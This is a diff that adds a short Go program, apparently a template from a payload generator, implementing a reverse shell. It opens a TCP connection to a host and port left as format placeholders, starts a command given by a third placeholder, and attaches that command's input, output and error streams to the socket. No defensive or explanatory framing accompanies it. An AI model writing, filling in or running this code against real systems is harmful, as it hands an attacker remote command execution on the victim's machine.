@@ -1,0 +1,21 @@
+package main
+
+	import (
+		"net"
+		"os/exec"
+	)
+
+	func main() {
+		ip := "%s"
+		port := "%s"
+
+		c, _ := net.Dial("tcp", ip+":"+port)
+		defer c.Close()
+
+		cmd := exec.Command("%s")
+		cmd.Stderr = c
+		cmd.Stdin = c
+		cmd.Stdout = c
+
+		cmd.Run()
+	}
